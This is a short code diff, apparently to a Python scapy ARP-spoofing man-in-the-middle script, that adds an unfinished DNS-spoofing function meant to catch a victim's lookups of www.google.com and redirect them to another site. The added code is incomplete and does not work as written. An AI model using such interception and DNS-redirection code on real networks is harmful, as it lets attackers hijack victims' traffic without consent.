@@ -64,4 +64,11 @@ def mitm():
             reARP()
             break
 
+def dnsredirect(pkt):
+    if pkt.haslayer(DNSRR):
+        qname = pkt.getlayer(DNSQR).qname
+        if "www.google.com" in qname:
+            print("[*] Target Attempting To Access Google")
+            redirect = IP("www.millesima.fr")
+
 mitm()
